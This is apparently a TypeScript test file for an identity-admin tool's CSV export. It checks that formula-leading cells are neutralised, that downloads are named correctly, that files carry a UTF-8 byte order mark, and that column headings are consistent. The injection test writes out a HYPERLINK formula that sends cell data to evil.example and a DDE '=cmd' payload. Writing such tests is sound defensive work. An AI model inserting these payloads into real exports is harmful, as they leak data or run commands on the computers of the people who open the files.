// A CSV cell that starts with a formula character is executed by the
// spreadsheet that opens it.
//
// Every value in IAMAI's CSVs is a tenant display name, sign-in address or
// department, and in a default Entra tenant any member can create a group and
// any guest sets their own display name. The exports go to an admin opening the
// recipient list in Excel to work a mail merge (audit redact-01,
// untrusted-content-rendering-01). Every lead character is checked, because a
// regex that covers four of six is the shape this bug takes.
import assert from 'node:assert/strict'
import test from 'node:test'
import { toCsv } from './format.ts'

const LEADS: { name: string; char: string }[] = [
  { name: 'equals', char: '=' },
  { name: 'plus', char: '+' },
  { name: 'minus', char: '-' },
  { name: 'at', char: '@' },
  { name: 'tab', char: '\t' },
  { name: 'carriage return', char: '\r' },
]

test('a cell beginning with any formula character is quoted as text, in every column', () => {
  for (const { name, char } of LEADS) {
    const payload = `${char}HYPERLINK("https://evil.example/?d="&A1,"ok")`
    const body = toCsv(['Name'], [[payload]]).split('\r\n')[1]
    // The apostrophe has to be the first character of the field. When the value
    // also needs RFC4180 quoting, that means immediately inside the quote.
    assert.ok(body.startsWith(`'${char}`) || body.startsWith(`"'${char}`), `${name} was not neutralised: ${JSON.stringify(body)}`)
  }
  assert.equal(toCsv(['A', 'B', 'C'], [['safe', '=1+1', '@SUM(A1)']]).split('\r\n')[1], `safe,'=1+1,'@SUM(A1)`)
  // The real attack shape from the audit: a group display name any tenant member can set, landing in recipients-*.csv.
  const csv = toCsv(['Name', 'Sign-in name', 'Department'], [['=cmd|\'/c calc\'!A1', 'a@b.example', 'Finance']])
  assert.ok(!csv.includes('\n=cmd'), 'the payload is still the first character of a cell')
  assert.ok(csv.includes(`'=cmd`), `not neutralised: ${csv}`)
})

test('ordinary values, a formula character mid-value, and RFC4180 quoting are left as they are', () => {
  assert.deepEqual(toCsv(['Name'], [['Priya Nair'], ['Sales — EMEA'], ['3 of 12'], [42], [null], [undefined]]).split('\r\n').slice(1), ['Priya Nair', 'Sales — EMEA', '3 of 12', '42', '', ''])
  // Only the leading position starts a formula; rewriting mid-string would corrupt "R&D - EMEA".
  assert.deepEqual(toCsv(['Name'], [['R&D - EMEA'], ['Q1=Q2 review']]).split('\r\n').slice(1), ['R&D - EMEA', 'Q1=Q2 review'])
  const rows = toCsv(['Name'], [['=a,b'], ['say "hi"'], ['two\nlines']]).split('\r\n')
  assert.equal(rows[1], `"'=a,b"`, rows[1])
  assert.equal(rows[2], `"say ""hi"""`, rows[2])
})

// F-047 and F-127 (owner, 2026-09-28): two clients' exports on one afternoon saved as
// iamai-people.csv and iamai-people (1).csv, and Excel mis-read the dashes and blanks.
test('a download names the tenant and the day, and a masked one names neither tenant nor what it masks', async () => {
  const { exportName } = await import('./exportGuard.ts')
  assert.equal(exportName('iamai-accounts.csv', 'Contoso Pty Ltd', { now: '2026-09-28T02:00:00Z' }).replace(/\d{4}-\d{2}-\d{2}/, 'DAY'), 'iamai-accounts-contoso-pty-ltd-DAY.csv')
  assert.equal(exportName('iamai-bundle-redacted.json', null, { now: '2026-09-28' }), 'iamai-bundle-redacted-2026-09-28.json')
  assert.equal(exportName('iamai-plan.json', '  ', { now: '2026-09-28' }), 'iamai-plan-2026-09-28.json', 'no tenant name, no empty slug')
  // Review, 2026-09-28: accents come off; a name with no Latin letters falls back to the tenant ID where the file may carry it.
  assert.equal(exportName('iamai-accounts.csv', 'Société Générale', { now: '2026-09-28' }), 'iamai-accounts-societe-generale-2026-09-28.csv')
  assert.equal(exportName('iamai-accounts.csv', 'Müller GmbH', { now: '2026-09-28' }), 'iamai-accounts-muller-gmbh-2026-09-28.csv')
  assert.equal(exportName('iamai-accounts.csv', 'Øresund Straße Łódź', { now: '2026-09-28' }), 'iamai-accounts-oresund-strasse-lodz-2026-09-28.csv', 'letters that do not decompose')
  assert.equal(exportName('iamai-accounts.csv', '株式会社', { id: '4a3b2c1d-0000-4000-8000-000000000000', now: '2026-09-28' }), 'iamai-accounts-4a3b2c1d-2026-09-28.csv')
  assert.equal(exportName('iamai-plan.ics', '株式会社', { now: '2026-09-28' }), 'iamai-plan-2026-09-28.ics', 'a masked file gets no ID')
})

test('a CSV opens in Excel as UTF-8, and an empty cell the screen dashes is blank in the file', async () => {
  const { csvFileBody } = await import('./exportGuard.ts')
  const body = csvFileBody(toCsv(['Name', 'Roles'], [['Avery', '—'], ['Drew', 'Global Administrator']]))
  assert.equal(body.charCodeAt(0), 0xfeff, 'no UTF-8 byte order mark')
  assert.equal(csvFileBody(body), body, 'the mark once, not twice')
  assert.equal(body.slice(1), 'Name,Roles\r\nAvery,\r\nDrew,Global Administrator')
})

test('the Export page\'s files are named as their buttons read, and the sign-in column is headed one way', async () => {
  const src = (await import('node:fs')).readFileSync(new URL('./surfaces/inventoryTables.ts', import.meta.url), 'utf8')
  for (const name of ['iamai-accounts.csv', 'iamai-authentication.csv', 'iamai-licensing.csv', 'iamai-sign-in-countries.csv']) assert.ok(src.includes(`'${name}'`), name)
  for (const old of ['iamai-people.csv', 'iamai-auth-methods.csv', 'iamai-licences.csv', 'iamai-signins-by-country.csv']) assert.ok(!src.includes(`'${old}'`), old)
  const { pages } = await import('../content/content.ts')
  const readiness = (pages as unknown as { readiness: { csvColumns: string[] } }).readiness.csvColumns
  const { INVENTORY } = await import('../copy/inventory.ts')
  assert.equal(readiness[1], 'Sign-in address')
  assert.ok(JSON.stringify(INVENTORY).includes('Sign-in address'), 'the accounts file heads its column another way')
  assert.equal((INVENTORY.signIns.columns as Record<string, string>).country, 'Country')
})
